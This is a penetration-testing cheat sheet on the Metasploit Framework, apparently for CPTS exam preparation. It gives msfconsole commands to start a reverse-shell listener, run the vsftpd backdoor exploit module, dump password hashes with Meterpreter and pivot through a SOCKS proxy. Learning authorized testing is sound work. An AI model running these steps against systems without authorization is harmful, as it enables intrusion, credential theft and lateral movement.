---
tool: Metasploit Framework
slug: metasploit
stages: [exploitation]
category: Exploitation framework
platforms: [linux, windows, network]
services: [smb, http, https, rdp, ftp]
ports: [21, 80, 443, 445, 3389]
tags: [exploitation, meterpreter, handler, post-exploitation, pivoting]
attack: [T1203, T1210, T1059]
summary: The exploitation framework: a searchable library of exploits and payloads, the multi/handler that catches shells, Meterpreter for post-exploitation, and routing for pivoting. The hub that ties weaponisation, exploitation and C2 together.
references:
  - Metasploit documentation | https://docs.metasploit.com/
  - Meterpreter | https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html
---

## When to reach for it

There is a known, matched vulnerability to exploit, or you need a reliable listener and post-exploitation shell. Metasploit runs the exploit, catches the callback, and gives you Meterpreter for the stage that follows. Also the easiest `multi/handler` for payloads you built with msfvenom.

## Key flags

Inside `msfconsole`:

- `search <term>`: find a module (by CVE, product, name).
- `use <module>`: select it; `info` shows what it does.
- `show options` / `set OPT value`: module settings (`RHOSTS`, `LHOST`, `LPORT`, `TARGETURI`).
- `set payload <payload>`: choose the payload.
- `check`: test if the target is vulnerable without firing.
- `run` / `exploit`: launch; `-j` backgrounds it as a job.
- `sessions -l` / `sessions -i N`: list and interact with shells.
- In Meterpreter: `getuid`, `sysinfo`, `hashdump`, `getsystem`, `background`.

## Commands

Catch a payload you generated with msfvenom:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 443; run"
```

A typical module run (set the target, payload and listener, then fire):

```text
msf6 > search type:exploit name:vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.10.10.5
msf6 > check
msf6 > run
```

Pivot through a session to reach a second network:

```text
msf6 > sessions -i 1
meterpreter > run autoroute -s 172.16.5.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > run
```

## Workflow

1. Identify the exact vulnerable product and version from the recon stage.
2. `search` for a matching module; read `info` and prefer modules with a `check`.
3. Set `RHOSTS`, the payload and `LHOST`/`LPORT`; run `check` before `run`.
4. On a session, drop to Meterpreter: `getuid`, `sysinfo`, then enumerate for privilege escalation.
5. To go deeper, add a route through the session and run a SOCKS proxy for your other tools.

## Notes

`check` first where the module supports it: some exploits crash the service. Keep payloads matched to the handler (staged vs stageless). Metasploit is powerful but loud; for the CPTS exam mindset, understand the manual exploit behind the module so you can reproduce it without the framework. Stay within scope and clean up sessions and artefacts afterwards.
